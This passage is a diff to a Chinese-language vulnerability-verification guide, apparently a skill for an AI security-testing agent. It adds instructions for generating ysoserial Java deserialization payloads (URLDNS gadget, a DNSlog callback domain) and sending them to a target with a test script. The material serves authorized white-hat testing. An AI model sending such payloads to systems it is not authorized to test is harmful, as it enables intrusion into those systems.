@@ -96,6 +96,21 @@ python {SKILL_ROOT}/scripts/dnslog.py get_records <domain> 5
 
 不同漏洞类型具体的使用场景，可按需参考用法： `{SKILL_ROOT}/references/dnslog-usage.md`
 
+### Java 反序列化 Payload 工具
+
+当 finding 已确认存在 Java 原生反序列化入口，并能根据目标依赖选择兼容 gadget 时，可按需使用 `{SKILL_ROOT}/scripts/deserialization_payload.py` 生成 ysoserial payload：
+
+```bash
+python {SKILL_ROOT}/scripts/deserialization_payload.py \
+  --gadget URLDNS \
+  --command "http://<unique-id>.<dnslog-domain>" \
+  --output payload.bin
+```
+
+- 优先使用 `URLDNS` 等低影响 OOB 探测。
+- 生成 payload 后仍必须通过 `http_test.py --data @payload.bin` 发送，禁止把“成功生成 payload”当作漏洞成立证据。
+- 必须结合目标依赖、反序列化格式和输入编码选择 gadget 与 `raw|base64|hex|url` 输出格式，不得机械遍历全部 gadget。
+
 ## 漏洞验证执行流程（强制）
 
 漏洞验证过程中，须遵循 **白帽子职业操守**。
